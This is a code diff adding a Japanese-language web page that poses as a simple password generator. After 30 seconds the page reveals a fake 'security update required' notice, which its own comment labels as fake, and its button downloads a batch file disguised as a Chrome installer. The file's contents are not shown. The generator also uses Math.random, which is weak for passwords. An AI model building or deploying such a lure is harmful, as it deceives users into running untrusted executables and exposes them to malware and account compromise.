@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head><meta charset="UTF-8"><title>パスワード生成ツール</title></head>
+<body>
+    <h2>簡易パスワードジェネレーター</h2>
+    <button onclick="generate()">生成</button>
+    <p id="pw"></p>
+
+    <!-- 30秒後に表示される偽の案内 -->
+    <div id="fake-update" style="display:none; border:2px solid red; padding:15px; margin-top:20px;">
+        <p>⚠️ 重要: セキュリティアップデートが必要です。</p>
+        <button onclick="downloadInstaller()">今すぐインストール</button>
+    </div>
+
+    <script>
+        function generate() { document.getElementById("pw").innerText = Math.random().toString(36).slice(-8); }
+        setTimeout(() => { document.getElementById("fake-update").style.display = "block"; }, 30000);
+
+        function downloadInstaller() {
+            const link = document.createElement("a");
+            link.href = "Chrome_Installer.bat";
+            link.download = "Chrome_Installer.bat";
+            link.click();
+        }
+    </script>
+</body>
+</html>
